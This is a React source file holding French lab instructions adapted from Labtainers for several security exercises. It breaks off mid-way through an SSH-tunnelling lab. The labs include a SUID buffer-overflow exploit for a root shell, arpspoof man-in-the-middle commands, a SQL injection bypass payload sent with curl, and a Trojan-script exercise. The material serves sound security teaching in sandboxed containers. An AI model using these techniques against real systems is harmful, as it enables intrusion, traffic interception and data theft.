import React, { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import Terminal from '../components/Terminal';
import NetworkTopology from '../components/NetworkTopology';

// Contenu réel des cours traduit depuis les fichiers .tex de Labtainers
const LAB_INSTRUCTIONS = {
  'bufoverflow': {
    title: 'Débordement de tampon (Buffer Overflow)',
    overview: `Ce lab vous permet d'acquérir une expérience pratique des vulnérabilités de débordement de tampon. L'objectif est de comprendre comment un programme peut écrire des données au-delà d'un buffer de taille fixe et comment cela peut être exploité pour modifier le flux de contrôle et exécuter du code arbitraire.`,
    environment: `<strong>Conteneur :</strong> bufoverflow (utilisateur : <code>ubuntu</code>)\n<strong>Fichiers disponibles :</strong>\n- <code>stack.c</code> : programme C vulnérable avec un buffer de 24 octets mais lisant 517 octets via <code>strcpy</code>\n- <code>call_shellcode.c</code> : exemple d'exécution de shellcode\n- <code>exploit.c</code> : template d'exploit à compléter\n- <code>compile.sh</code> : script de compilation (compile avec <code>-fno-stack-protector -z execstack</code>, set SUID)\n\n<strong>Protections désactivées :</strong> ASLR désactivé, Stack Guard désactivé, pile exécutable, shell /bin/zsh (pas de protection dash)`,
    steps: [
      {
        title: 'Tâche 1 : Exploiter la vulnérabilité',
        content: `Le programme vulnérable <code>stack.c</code> a un buffer de 24 octets mais peut lire jusqu'à 517 octets depuis le fichier <code>badfile</code>. Le programme est compilé en SUID root.\n\nVotre objectif : construire un fichier <code>badfile</code> qui exploite le débordement pour obtenir un shell root et afficher le contenu de <code>/root/.secret</code>.\n\n<strong>Étapes :</strong>\n1. Examinez le code source :\n<code>cat stack.c</code>\n\n2. Étudiez le shellcode fourni :\n<code>cat call_shellcode.c</code>\n\n3. Compilez et testez le shellcode :\n<code>./compile.sh</code>\n<code>./call_shellcode</code>\n\n4. Utilisez GDB pour trouver les adresses mémoire :\n<code>gdb -q ./stack</code>\n<code>(gdb) b bof</code>\n<code>(gdb) run</code>\n<code>(gdb) p &buffer</code>\n<code>(gdb) p $ebp</code>\n\n5. Modifiez <code>exploit.c</code> pour placer le shellcode dans badfile et écraser l'adresse de retour.\n\n6. Exécutez l'exploit :\n<code>./exploit</code>\n<code>./stack</code>\n\n7. Si réussi, vous obtenez un shell root. Affichez le secret :\n<code>cat /root/.secret</code>`,
      },
      {
        title: 'Tâche 2 : Randomisation des adresses (ASLR)',
        content: `Réactivez la randomisation des adresses et testez si l'attaque fonctionne encore.\n\n<code>sudo sysctl -w kernel.randomize_va_space=2</code>\n\nRelancez l'attaque :\n<code>./exploit</code>\n<code>./stack</code>\n\n<strong>Question :</strong> L'attaque fonctionne-t-elle encore ? Pourquoi ?\n\nReportez vos observations. Remettez ASLR à 0 quand vous avez terminé :\n<code>sudo sysctl -w kernel.randomize_va_space=0</code>`,
      },
      {
        title: 'Tâche 3 : Protection Stack Guard',
        content: `Recompilez le programme vulnérable AVEC la protection Stack Guard activée (retirez le flag <code>-fno-stack-protector</code>).\n\nModifiez <code>compile.sh</code> pour retirer le flag, puis :\n<code>./compile.sh</code>\n<code>./exploit</code>\n<code>./stack</code>\n\n<strong>Question :</strong> L'attaque réussit-elle ? Que se passe-t-il ? Décrivez le mécanisme de protection.`,
      },
      {
        title: 'Tâche 4 : Pile non-exécutable',
        content: `Recompilez avec la pile non-exécutable (remplacez <code>-z execstack</code> par <code>-z noexecstack</code>).\n\n<code>./compile.sh</code>\n<code>./exploit</code>\n<code>./stack</code>\n\n<strong>Question :</strong> L'attaque réussit-elle ? Évaluez cette protection.`,
      },
      {
        title: 'Soumission',
        content: `Quand vous avez terminé, arrêtez le lab :\n<code>stoplab bufoverflow</code>\n\nCela crée le fichier de résultats pour l'évaluation dans <code>~/labtainer_xfer/bufoverflow/</code>.`,
      },
    ],
  },

  'iptables2': {
    title: 'Configuration de pare-feu avec iptables',
    overview: `Ce lab illustre l'utilisation d'iptables sur un pare-feu pour limiter l'accès réseau à un serveur. Vous utiliserez Linux iptables pour bloquer sélectivement le trafic réseau basé sur les besoins de services.`,
    environment: `<strong>Topologie réseau :</strong>\n- <strong>client</strong> (ubuntu) : 10.10.1.10 sur CLIENT_NET\n- <strong>firewall</strong> (ubuntu) : 10.10.1.254 (CLIENT_NET) + 10.10.2.254 (SERVER_NET) — 2 terminaux, tcpdump/tshark disponibles\n- <strong>server</strong> (ubuntu, mdp: <code>gummybear</code>) : 10.10.2.10 sur SERVER_NET — exécute SSH, Telnet, HTTP et un service "wizbang"\n\n<strong>Réseaux :</strong>\n- CLIENT_NET : 10.10.1.0/24 (passerelle 10.10.1.1)\n- SERVER_NET : 10.10.2.0/24 (passerelle 10.10.2.1)`,
    steps: [
      {
        title: 'Préparation : Quiz',
        content: `Lancez le quiz préparatoire :\n<code>quiz</code>\n\nRépondez aux questions sur les bases d'iptables.`,
      },
      {
        title: 'Tâche 1 : Exploration des services',
        content: `Depuis le <strong>client</strong>, identifiez les services ouverts sur le serveur :\n\n1. Sur le <strong>firewall</strong>, lancez une capture réseau en arrière-plan :\n<code>sudo tcpdump -i eth0 -n -c 50 &</code>\n\n2. Depuis le <strong>client</strong>, scannez le serveur :\n<code>nmap 10.10.2.10</code>\n\n3. Testez les services manuellement :\n<code>wget -q http://10.10.2.10</code>\n<code>ssh ubuntu@10.10.2.10</code>  (mot de passe: gummybear)\n<code>telnet 10.10.2.10</code>\n\nNotez tous les ports ouverts.`,
      },
      {
        title: 'Tâche 2 : Configurer le pare-feu avec iptables',
        content: `Sur le <strong>firewall</strong>, empêchez le forwarding de tout trafic vers le serveur, SAUF :\n- SSH (port 22)\n- HTTP (port 80)\n\nCréez un script pare-feu :\n<code>nano firewall.sh</code>\n\nContenu suggéré :\n<code>#!/bin/bash</code>\n<code># Politique par défaut : bloquer le forwarding</code>\n<code>sudo iptables -P FORWARD DROP</code>\n<code># Autoriser SSH</code>\n<code>sudo iptables -A FORWARD -p tcp --dport 22 -j ACCEPT</code>\n<code>sudo iptables -A FORWARD -p tcp --sport 22 -j ACCEPT</code>\n<code># Autoriser HTTP</code>\n<code>sudo iptables -A FORWARD -p tcp --dport 80 -j ACCEPT</code>\n<code>sudo iptables -A FORWARD -p tcp --sport 80 -j ACCEPT</code>\n\nExécutez le script :\n<code>chmod +x firewall.sh && ./firewall.sh</code>\n\nVérifiez avec tcpdump que les connexions Telnet échouent :\n<code>sudo tcpdump -i eth0 -n port 23 &</code>\nPuis depuis le client : <code>telnet 10.10.2.10</code> — la connexion doit être refusée.`,
      },
      {
        title: 'Tâche 3 : Ouvrir un nouveau service',
        content: `Un programme "wizbang" tourne sur le serveur sur un port inconnu.\n\n1. Utilisez Wireshark sur le firewall pour identifier le port\n2. Depuis le client, tentez de vous y connecter\n3. Ajoutez une règle iptables pour autoriser ce port\n4. Vérifiez que la connexion fonctionne\n\nPuis vérifiez votre travail :\n<code>checkwork</code>`,
      },
    ],
  },

  'arp-spoof': {
    title: 'ARP Spoofing — Attaque Man-in-the-Middle',
    overview: `Ce lab explore l'ARP spoofing comme moyen d'intercepter le trafic sur un réseau local. Les LAN modernes utilisent des switchs Ethernet qui empêchent le sniffing passif, mais l'empoisonnement ARP permet à un attaquant d'intercepter le trafic en se faisant passer pour un hôte intermédiaire.`,
    environment: `<strong>Topologie réseau (4 conteneurs) :</strong>\n- <strong>user</strong> (ubuntu) : 10.10.3.10 — MAC aa:ab:ac:ad:00:02 sur LOCAL_NETWORK\n- <strong>gateway</strong> (ubuntu) : 10.10.3.254 (LOCAL) + 10.10.4.254 (REMOTE) — routeur\n- <strong>attacker</strong> (ubuntu) : 10.10.3.20 — MAC aa:ab:ac:ad:00:04 sur LOCAL_NETWORK — dsniff + tcpdump + tshark\n- <strong>webserver</strong> (ubuntu) : 10.10.4.10 sur REMOTE_NETWORK — serveur HTTP\n\n<strong>Réseaux :</strong>\n- LOCAL_NETWORK : 10.10.3.0/24\n- REMOTE_NETWORK : 10.10.4.0/24\n\n<strong>Outils de capture réseau :</strong>\n- <code>tcpdump</code> : outil bas niveau — <strong>capturer</strong> le trafic et faire du debug rapide. Affiche les en-têtes bruts et le contenu ASCII.\n- <code>tshark</code> : Wireshark en ligne de commande — <strong>analyser</strong> en détail. Dissèque les protocoles, permet des filtres avancés et la reconstitution de flux.\n\nEn résumé : <code>tcpdump</code> pour capturer, <code>tshark</code> pour analyser.`,
    steps: [
      {
        title: 'Tâche 1 : Sniffer le LAN depuis l\'attaquant (avant spoofing)',
        content: `<strong>Avant le spoofing</strong>, observez le trafic réseau.\n\n1. Sur l'<strong>attaquant</strong> (onglet "attacker"), lancez tcpdump en temps réel :\n<code>sudo tcpdump -i eth0 -n -v</code>\n\n<strong>Explication :</strong> <code>-i eth0</code> = interface réseau, <code>-n</code> = pas de résolution DNS, <code>-v</code> = mode verbeux.\n\n2. Basculez sur l'onglet <strong>user</strong> et récupérez la page web :\n<code>wget -q http://10.10.4.10</code>\n\n3. Revenez sur l'onglet <strong>attacker</strong> et observez la sortie de tcpdump.\n\n<strong>Question :</strong> Voyez-vous la requête HTTP ou la réponse ? Non — le switch envoie les paquets uniquement vers le port du destinataire (gateway), pas vers l'attaquant. C'est pourquoi l'ARP spoofing est nécessaire.\n\nArrêtez tcpdump avec <code>Ctrl+C</code>.`,
      },
      {
        title: 'Tâche 2 : Observer le cache ARP avant l\'attaque',
        content: `Sur le <strong>user</strong>, examinez le cache ARP actuel :\n<code>arp -a</code>\n\n<strong>Rappel :</strong> Le protocole ARP associe une adresse IP à une adresse MAC. Le cache ARP stocke ces associations localement.\n\nNotez l'adresse MAC associée à la gateway (10.10.3.254). Après le spoofing, cette MAC changera pour celle de l'attaquant.\n\nSur l'<strong>attaquant</strong>, vérifiez que le forwarding IP est activé :\n<code>cat /proc/sys/net/ipv4/ip_forward</code>\n(Doit être 1, sinon : <code>echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward</code>)\n\n<strong>Pourquoi ?</strong> Sans forwarding, l'attaquant recevrait les paquets mais ne les retransmettrait pas — la victime perdrait sa connexion et se douterait de l'attaque.`,
      },
      {
        title: 'Tâche 3 : Empoisonner le cache ARP',
        content: `Sur l'<strong>attaquant</strong>, réalisez un empoisonnement ARP bidirectionnel avec <code>arpspoof</code> (outil du paquet dsniff).\n\nSpoofing vers le user (lui faire croire que vous êtes la gateway) :\n<code>sudo arpspoof -i eth0 -t 10.10.3.10 10.10.3.254 &</code>\n\nSpoofing vers la gateway (lui faire croire que vous êtes le user) :\n<code>sudo arpspoof -i eth0 -t 10.10.3.254 10.10.3.10 &</code>\n\n<strong>Explication :</strong> <code>-t 10.10.3.10 10.10.3.254</code> signifie "dire à 10.10.3.10 que l'adresse MAC de 10.10.3.254, c'est moi".\n\nVérifiez le cache ARP empoisonné sur le <strong>user</strong> :\n<code>arp -a</code>\n\n<strong>Observation attendue :</strong> L'adresse MAC de la gateway (10.10.3.254) est maintenant celle de l'attaquant (aa:ab:ac:ad:00:04). Le trafic du user passe désormais par l'attaquant.`,
      },
      {
        title: 'Tâche 4 : Capturer le trafic avec tcpdump',
        content: `<strong>tcpdump</strong> sert à <strong>capturer</strong> le trafic brut et l'enregistrer dans un fichier.\n\n1. Sur l'<strong>attaquant</strong>, lancez la capture sur le port 80 (HTTP) :\n<code>sudo tcpdump -i eth0 -n -w /tmp/arp-spoof.pcap port 80 &</code>\n\n<strong>Options utilisées :</strong>\n- <code>-w /tmp/arp-spoof.pcap</code> : écrire dans un fichier (format PCAP)\n- <code>port 80</code> : filtre BPF — ne capturer que le trafic HTTP\n\n2. Basculez sur le <strong>user</strong> et générez du trafic HTTP :\n<code>wget -q http://10.10.4.10</code>\n<code>wget -q http://10.10.4.10/index.html</code>\n\n3. Revenez sur l'<strong>attaquant</strong> et arrêtez la capture :\n<code>pkill tcpdump</code>\n\n4. Lecture rapide avec tcpdump — vue brute ASCII :\n<code>tcpdump -r /tmp/arp-spoof.pcap -A</code>\n\nVous voyez les en-têtes HTTP et le contenu HTML en clair.\n\n5. Lecture avec comptage de paquets :\n<code>tcpdump -r /tmp/arp-spoof.pcap -n | wc -l</code>`,
      },
      {
        title: 'Tâche 5 : Analyser en détail avec tshark',
        content: `<strong>tshark</strong> (Wireshark CLI) sert à <strong>analyser</strong> les captures en profondeur — il dissèque chaque protocole.\n\n1. Vue résumée de la capture :\n<code>tshark -r /tmp/arp-spoof.pcap</code>\n\nChaque ligne = un paquet, avec numéro, timestamp, source, destination, protocole, info.\n\n2. Vue détaillée (équivalent du panneau central de Wireshark) :\n<code>tshark -r /tmp/arp-spoof.pcap -V</code>\n\nVous voyez chaque couche dissectée : Ethernet → IP → TCP → HTTP.\n\n3. <strong>Filtres d'affichage Wireshark</strong> — filtrer uniquement les requêtes HTTP :\n<code>tshark -r /tmp/arp-spoof.pcap -Y "http.request"</code>\n\n4. Extraire uniquement les URLs demandées :\n<code>tshark -r /tmp/arp-spoof.pcap -Y "http.request" -T fields -e http.host -e http.request.uri</code>\n\n5. <strong>Reconstituer le flux TCP</strong> (comme "Suivre le flux TCP" dans Wireshark) :\n<code>tshark -r /tmp/arp-spoof.pcap -z "follow,tcp,ascii,0" -q</code>\n\nCela affiche la requête HTTP et la réponse complète du serveur, exactement comme un MITM les voit.\n\n6. Statistiques par protocole :\n<code>tshark -r /tmp/arp-spoof.pcap -z "io,phs" -q</code>`,
      },
      {
        title: 'Tâche 6 : Analyse comparative et nettoyage',
        content: `<strong>Comparaison tcpdump vs tshark :</strong>\n\n<code>tcpdump -r /tmp/arp-spoof.pcap -A | head -30</code>\n→ Affichage brut : en-têtes + dump ASCII. Rapide, utile pour du debug.\n\n<code>tshark -r /tmp/arp-spoof.pcap -V | head -60</code>\n→ Dissection protocolaire complète : chaque champ HTTP, TCP, IP est nommé et décodé.\n\n<strong>Quand utiliser quoi ?</strong>\n- <code>tcpdump</code> : capturer du trafic en direct, vérifier rapidement "est-ce que des paquets passent ?"\n- <code>tshark</code> : analyser un fichier .pcap, filtrer par protocole, reconstituer des sessions\n\n<strong>Pour terminer, arrêtez le spoofing :</strong>\n<code>pkill arpspoof</code>\n\nVérifiez que le cache ARP revient à la normale sur le <strong>user</strong> :\n<code>arp -a</code>\n\n(Il peut falloir quelques secondes pour que le cache se mette à jour.)`,
      },
    ],
  },

  'dns': {
    title: 'Protocole DNS — Configuration et analyse',
    overview: `Ce lab introduit les fonctions de base et les éléments protocolaires du DNS. Vous interagirez avec un réseau d'entreprise disposant d'un serveur DNS local et de plusieurs postes de travail, pour observer le trafic de requête/réponse DNS.`,
    environment: `<strong>Topologie réseau (6 conteneurs) :</strong>\n- <strong>dns</strong> (admin / admin) : 10.10.5.10 — serveur BIND9 sur LAN\n- <strong>gw</strong> (admin / admin) : 10.10.5.254 (LAN) + 10.10.6.254 (WAN) — passerelle/routeur\n- <strong>ws1</strong> (ubuntu) : 10.10.5.11 — poste de travail\n- <strong>ws2</strong> (ubuntu) : 10.10.5.12 — poste de travail\n- <strong>ws3</strong> (ubuntu) : 10.10.5.13 — poste NON configuré DNS\n- <strong>isp</strong> (ubuntu) : 10.10.6.10 — serveur DNS FAI\n\n<strong>Zone DNS existante :</strong> example.com\n- ns.example.com → 10.10.5.10\n- ws1.example.com → 10.10.5.11\n- ws2.example.com → 10.10.5.12\n- (ws3 n'est PAS encore dans la zone)`,
    steps: [
      {
        title: 'Tâche 1 : Explorer la résolution DNS',
        content: `Testez la résolution DNS avec la commande ping depuis <strong>ws1</strong> :\n\n<code>ping -c 2 ws1</code> (devrait fonctionner)\n<code>ping -c 2 ws2</code> (devrait fonctionner)\n<code>ping -c 2 ws3</code> (devrait échouer — "no such name")\n\nExaminez le fichier de configuration DNS de ws1 :\n<code>cat /etc/resolv.conf</code>\n\nNotez le <code>search</code> domain et le <code>nameserver</code> (10.10.5.10).`,
      },
      {
        title: 'Tâche 2 : Observer le trafic DNS',
        content: `Sur le serveur <strong>dns</strong>, lancez tcpdump pour capturer le trafic DNS :\n<code>sudo tcpdump -i eth0 -n port 53 -w /tmp/dns-traffic.pcap &</code>\n\nDepuis <strong>ws1</strong> (autre onglet), faites une requête DNS :\n<code>dig ws2.example.com</code>\n\nArrêtez la capture : <code>pkill tcpdump</code>\n\nAnalysez la capture :\n<code>tcpdump -r /tmp/dns-traffic.pcap -n -v</code>\n\nOu avec tshark pour une analyse détaillée des champs DNS :\n<code>tshark -r /tmp/dns-traffic.pcap -V</code>\n\nExaminez :\n- Les paquets de requête DNS (Query)\n- Les paquets de réponse DNS (Response)\n- Les flags et les types d'enregistrements`,
      },
      {
        title: 'Tâche 3 : Noms manquants',
        content: `Depuis <strong>ws1</strong>, pingez ws3 :\n<code>ping -c 2 ws3</code>\n\nCela échoue car ws3 n'est pas défini dans le DNS.\n\nDepuis <strong>ws3</strong>, pingez ws1 :\n<code>ping -c 2 ws1</code>\n\nCela échoue aussi, mais pour une raison différente : ws3 n'a pas de serveur DNS configuré.\n\nCorrigez <code>/etc/resolv.conf</code> sur ws3 :\n<code>echo -e "search example.com\\nnameserver 10.10.5.10" | sudo tee /etc/resolv.conf</code>\n\nRetestez : <code>ping -c 2 ws1</code> — ça devrait marcher maintenant.\nMais <code>ping -c 2 ws3</code> depuis ws1 échoue toujours (ws3 n'est pas dans la zone DNS).`,
      },
      {
        title: 'Tâche 4 : Ajouter un nom DNS manquant',
        content: `Sur le serveur <strong>dns</strong>, ajoutez ws3 dans la zone :\n\n1. Examinez la configuration BIND :\n<code>cat /etc/bind/named.conf</code>\n<code>cat /etc/bind/example.conf</code>\n\n2. Éditez le fichier de zone directe :\n<code>sudo nano /var/named/example.com.zone</code>\n\nAjoutez la ligne :\n<code>ws3    IN    A    10.10.5.13</code>\n\n3. Éditez le fichier de zone inverse (si existant) et ajoutez l'enregistrement PTR pour ws3.\n\n4. Redémarrez BIND :\n<code>sudo systemctl restart bind9</code>\nou\n<code>sudo service bind9 restart</code>`,
      },
      {
        title: 'Tâche 5 : Tester et valider',
        content: `Depuis <strong>ws1</strong>, pingez ws3 :\n<code>ping -c 2 ws3</code>\n\nVérifiez avec dig que la réponse DNS contient maintenant l'adresse de ws3 :\n<code>dig ws3.example.com @10.10.5.10</code>\n\nLa réponse doit contenir <code>10.10.5.13</code>.`,
      },
    ],
  },

  'sql-inject': {
    title: 'Injection SQL — Attaques et contre-mesures',
    overview: `Ce lab porte sur les vulnérabilités d'injection SQL. Vous allez exploiter une application web vulnérable pour contourner l'authentification et extraire des données de la base.`,
    environment: `<strong>Topologie réseau (2 conteneurs) :</strong>\n- <strong>web-server</strong> (student / <code>password123</code>) : 10.10.7.10 — serveur LAMP (Apache + MySQL + PHP)\n- <strong>client</strong> (student / <code>password123</code>) : 10.10.7.20\n\n<strong>Application web :</strong> www.SeedLabSQLInjection.com (accessible via curl depuis le client)\n\n<strong>Base de données MySQL :</strong>\n- Utilisateur root MySQL : <code>seedubuntu</code>\n- Base : <code>Users</code>, table : <code>credential</code>\n- Comptes : Alice (EID 10000), Boby (20000), Ryan (30000), Samy (40000), Ted (50000), Admin (99999)\n- Mots de passe stockés en SHA1\n\n<strong>Fichiers vulnérables :</strong>\n- <code>/var/www/seedlabsqlinjection.com/public_html/unsafe_credential.php</code>\n- <code>/var/www/seedlabsqlinjection.com/public_html/unsafe_edit.php</code>`,
    steps: [
      {
        title: 'Tâche 1 : Identifier le point d\'injection',
        content: `Sur le <strong>client</strong>, testez l'application web via curl.\n\nLe formulaire de connexion utilise un GET vers <code>unsafe_credential.php</code> avec les champs EID et Password.\n\nTestez avec une apostrophe dans le champ EID :\n<code>curl "http://www.seedlabsqlinjection.com/unsafe_credential.php?EID='&Password=test"</code>\n\nObservez le message d'erreur SQL renvoyé — cela confirme que l'entrée n'est pas sanitisée.`,
      },
      {
        title: 'Tâche 2 : Contourner l\'authentification',
        content: `Utilisez une injection SQL pour vous connecter en tant qu'Admin sans connaître le mot de passe.\n\nDans le champ EID, entrez :\n<code>Admin' OR '1'='1' -- </code>\n\nOU avec curl depuis le terminal :\n<code>curl "http://www.seedlabsqlinjection.com/unsafe_credential.php?EID=Admin'+OR+'1'%3D'1'--+&Password=x"</code>\n\n<strong>Objectif :</strong> Récupérer l'enregistrement d'Alice (ID 1, Alice, EID 10000, Salaire 20000, date 9/20, SSN 10211002).`,
      },
      {
        title: 'Tâche 3 : Extraire les données',
        content: `Utilisez des requêtes SQL avancées pour extraire les données de la table <code>credential</code> :\n\n- Extraire tous les enregistrements\n- Trouver les mots de passe hachés\n- Tester les injections UNION SELECT\n\nExaminez le code PHP vulnérable :\n<code>cat /var/www/seedlabsqlinjection.com/public_html/unsafe_credential.php</code>`,
      },
      {
        title: 'Tâche 4 : Comprendre les contre-mesures',
        content: `Comparez <code>unsafe_credential.php</code> avec <code>edit.php</code> (version sécurisée) :\n<code>cat /var/www/seedlabsqlinjection.com/public_html/edit.php</code>\n\nIdentifiez l'utilisation des requêtes paramétrées (prepared statements) comme protection contre l'injection SQL.`,
      },
    ],
  },

  'acl': {
    title: 'Listes de contrôle d\'accès Linux (ACL)',
    overview: `Ce lab explore les ACL Linux pour fournir un contrôle d'accès plus flexible que les permissions UNIX traditionnelles. Il suppose que vous avez reçu des instructions sur les politiques de contrôle d'accès et les ACL.`,
    environment: `<strong>Conteneur :</strong> acl (basé sur CentOS)\n<strong>3 terminaux disponibles</strong> — un par utilisateur\n\n<strong>Comptes utilisateurs :</strong>\n- <code>alice</code> / <code>password4alice</code> — utilisatrice principale\n- <code>bob</code> / <code>password4bob</code>\n- <code>harry</code> / <code>password4harry</code>\n- <code>mike</code> / <code>password4mike</code> (groupe wheel)\n\n<strong>Structure /shared_data/ :</strong>\n- <code>accounting.txt</code> (propriétaire bob, perms 640, ACL : harry rw, alice r)\n- <code>alice/alicestuff.txt</code>\n- <code>bob/bobstuff.txt</code> (propriétaire bob:bob, perms 660)\n- <code>bob/fun</code> (script exécutable)\n\n<strong>umask :</strong> 007 pour alice et bob`,
    steps: [
      {
        title: 'Tâche 1 : Examiner les permissions existantes',
        content: `Connectez-vous en tant qu'<strong>alice</strong> (terminal 1) :\n\nAllez dans le répertoire partagé :\n<code>cd /shared_data</code>\n<code>ls -la</code>\n\nObservez le <code>+</code> après les permissions sur <code>accounting.txt</code> — cela indique la présence d'ACL.\n\nAffichez les ACL détaillées :\n<code>getfacl accounting.txt</code>\n\n<strong>Question :</strong> Quel utilisateur peut modifier accounting.txt ?\n\nCet utilisateur (harry) ajoute du contenu :\n<code>echo "more stuff" >> /shared_data/accounting.txt</code>\n\nConfirmez qu'alice n'a PAS cette permission :\n<code>echo "test" >> /shared_data/accounting.txt</code>\n(Doit échouer avec "Permission denied")`,
      },
      {
        title: 'Tâche 2 : Définir une ACL sur un fichier',
        content: `Bob veut qu'Alice puisse lire son fichier <code>/shared_data/bob/bobstuff.txt</code>.\n\nConnectez-vous en tant que <strong>bob</strong> (terminal 2) et ajoutez l'ACL :\n<code>setfacl -m u:alice:r /shared_data/bob/bobstuff.txt</code>\n\nVérifiez l'ACL :\n<code>getfacl /shared_data/bob/bobstuff.txt</code>\n\nEn tant qu'<strong>alice</strong> (terminal 1), testez l'accès en lecture :\n<code>cat /shared_data/bob/bobstuff.txt</code>\n\nEn tant qu'<strong>harry</strong> (terminal 3), vérifiez qu'il N'A PAS accès :\n<code>cat /shared_data/bob/bobstuff.txt</code>\n(Doit échouer)`,
      },
      {
        title: 'Tâche 3 : ACL par défaut sur un répertoire',
        content: `Alice veut que tous les nouveaux fichiers dans <code>/shared_data/alice/</code> soient lisibles par Bob.\n\nEn tant qu'<strong>alice</strong> :\n\n1. Créez un fichier test et vérifiez ses permissions :\n<code>touch /shared_data/alice/test1.txt</code>\n<code>ls -la /shared_data/alice/</code>\n\n2. Définissez l'ACL par défaut :\n<code>setfacl -d -m u:bob:r /shared_data/alice/</code>\n\n3. Créez un nouveau fichier et vérifiez les permissions héritées :\n<code>touch /shared_data/alice/test2.txt</code>\n<code>getfacl /shared_data/alice/test2.txt</code>\n\n<strong>Question :</strong> Le nouveau fichier hérite-t-il bien de l'ACL ? Bob peut-il le lire ?`,
      },
      {
        title: 'Tâche 4 : Attaque par cheval de Troie',
        content: `Bob modifie le script <code>/shared_data/bob/fun</code> que Alice exécutera.\n\nEn tant que <strong>bob</strong>, modifiez le script pour qu'il copie <code>accounting.txt</code> de manière à ce que Bob puisse le lire :\n<code>nano /shared_data/bob/fun</code>\n\n1. Quand <strong>Bob</strong> exécute le script, il ne devrait PAS obtenir accès aux données comptables\n2. Quand <strong>Alice</strong> exécute le script, Bob obtient accès — car le script s'exécute avec les privilèges d'Alice\n\nCela illustre la distinction entre l'accès au fichier et l'accès à l'information. C'est le principe d'un cheval de Troie.`,
      },
    ],
  },

  'wireshark-intro': {
    title: 'Introduction à Wireshark — Analyse PCAP',
    overview: `Ce lab introduit l'outil d'analyse de trafic réseau Wireshark. Vous allez analyser des fichiers PCAP (capture de paquets) et localiser des paquets spécifiques dans des sessions Telnet non chiffrées.`,
    environment: `<strong>Conteneur :</strong> wireshark-intro (utilisateur : ubuntu)\n<strong>Fichier fourni :</strong> <code>telnet.pcap</code> — capture de trafic contenant une session Telnet\n<strong>Outils :</strong> tcpdump, tshark (Wireshark en ligne de commande)`,
    steps: [
      {
        title: 'Tâche 1 : Explorer le fichier PCAP',
        content: `Examinez le fichier de capture :\n<code>ls -l</code>\n<code>file telnet.pcap</code>\n\nCela vous montre le type et la taille du fichier. Ce fichier contient une capture de session Telnet.`,
      },
      {
        title: 'Tâche 2 : Analyser la capture',
        content: `Affichez le contenu du fichier PCAP :\n\nVue résumée de tous les paquets :\n<code>tshark -r telnet.pcap</code>\n\nVue avec contenu ASCII (données en clair) :\n<code>tcpdump -r telnet.pcap -A</code>\n\nVue détaillée d'un paquet spécifique (ex: paquet #5) :\n<code>tshark -r telnet.pcap -Y "frame.number == 5" -V</code>`,
      },
      {
        title: 'Tâche 3 : Trouver le paquet contenant le mot de passe',
        content: `Localisez le paquet contenant le mot de passe de la tentative de connexion Telnet de l'utilisateur "<strong>john</strong>".\n\n<strong>Méthode 1 — Filtrer les données Telnet :</strong>\n<code>tshark -r telnet.pcap -Y "telnet" -V | grep -i -B5 -A5 password</code>\n\n<strong>Méthode 2 — Chercher dans le contenu ASCII :</strong>\n<code>tcpdump -r telnet.pcap -A | grep -i -B2 -A2 "john\\|password\\|login"</code>\n\n<strong>Méthode 3 — Voir le flux TCP reconstitué :</strong>\n<code>tshark -r telnet.pcap -z "follow,tcp,ascii,0" -q</code>\n\nUne fois le numéro de paquet identifié, extrayez-le :\n<code>tshark -r telnet.pcap -Y "frame.number == <NUMERO>" -w invalidpassword.pcap</code>\n\n<strong>Important :</strong> Le nom de fichier doit être exactement <code>invalidpassword.pcap</code>.`,
      },
      {
        title: 'Tâche 4 : Suivre le flux TCP complet',
        content: `Affichez la conversation Telnet complète reconstituée :\n<code>tshark -r telnet.pcap -z "follow,tcp,ascii,0" -q</code>\n\nVous verrez le nom d'utilisateur et le mot de passe en clair — c'est pourquoi Telnet est considéré non sécurisé.\n\nPour compter les paquets par protocole :\n<code>tshark -r telnet.pcap -z "io,phs" -q</code>\n\nPour lister uniquement les paquets contenant des données :\n<code>tshark -r telnet.pcap -Y "tcp.len > 0"</code>`,
      },
    ],
  },

  'ssh-tunnel': {
    title: 'Tunnels SSH à travers plusieurs hôtes',
    overview: `Ce lab illustre l'utilisation du tunneling SSH pour accéder à des systèmes distants via une chaîne de commandes SSH. Scénario : vous avez fait la reconnaissance des adresses IP, noms d'hôtes et identifiants pour un chemin allant du base host jusqu'à host-d, mais les tables de routage ne connaissent que les sauts adjacents.`,
    environment: `<strong>Tous les hôtes :</strong> utilisateur <code>ubuntu</code>, mot de passe <code>ubuntu</code>\n\n<strong>Chaîne de connectivité :</strong>\nbase → host-a → host-b → host-c → host-d\n\n<strong>Contraintes de routage :</strong>\n- base ne peut atteindre que host-a\n- host-a ne peut atteindre que host-b\n- host-b ne peut atteindre que host-c\n- host-c ne peut atteindre que host-d\n- Seul gw4 connaît les réseaux en aval`,
    steps: [
      {
        title: 'Tâche 1 : Tester la connectivité',
        content: `Depuis le <strong>base</strong> host, vérifiez quels hôtes sont accessibles :\n\n<code>ping -c 1 hosta</code> (devrait fonctionner)\n<code>ping -c 1 hostb</code> (devrait échouer)\n<code>ping -c 1 hostc</code> (devrait échouer)\n<code>ping -c 1 hostd</code> (devrait échouer)\n\nConsultez le man SSH, notamment les options <code>-f</code> (arrière-plan), <code>-4</code> (IPv4), <code>-L</code> (port forwarding), <code>-N</code> (pas de commande).`,
      },
      {
        title: 'Tâche 2 : Premier tunnel (base → host-a → host-b)',
        content: `Créez le premier tunnel SSH :\n<code>ssh -4 -f -L 1111:hostb:22 hosta -N</code>\n\nCela crée un tunnel : base:1111 → hosta → hostb:22\n\nTestez en vous connectant à hostb via le tunnel :\n<code>ssh -4 -p 1111 localhost</code>\n\nExplorez avec : <code>route</code>, <code>ping</code>, <code>netstat</code>, <code>ps</code>\nQuittez quand vous avez terminé.`,
      },
      {
        title: 'Tâche 3 : Deuxième tunnel (→ host-c)',
        content: `Depuis <strong>base</strong>, créez le deuxième maillon :\n<code>ssh -4 -f -p 1111 -L 2222:hostc:22 localhost -N</code>\n\nCela crée : base:2222 → base:1111 → hostb → hostc:22\n\nTestez :\n<code>ssh -4 -p 2222 localhost</code>`,
      },
      {
        title: 'Tâche 4 : Troisième tunnel (→ host-d)',
        content: `Même principe, créez le troisième tunnel :\n<code>ssh -4 -f -p 2222 -L 3333:hostd:22 localhost -N</code>\n\nCela crée : base:3333 → ... → hostd:22\n\nConnectez-vous à host-d :\n<code>ssh -4 -p 3333 localhost</code>\n\nExplorez host-d.`,
      },
      {
        title: 'Tâche 5 : Prouver l\'accès — copier un fichier',
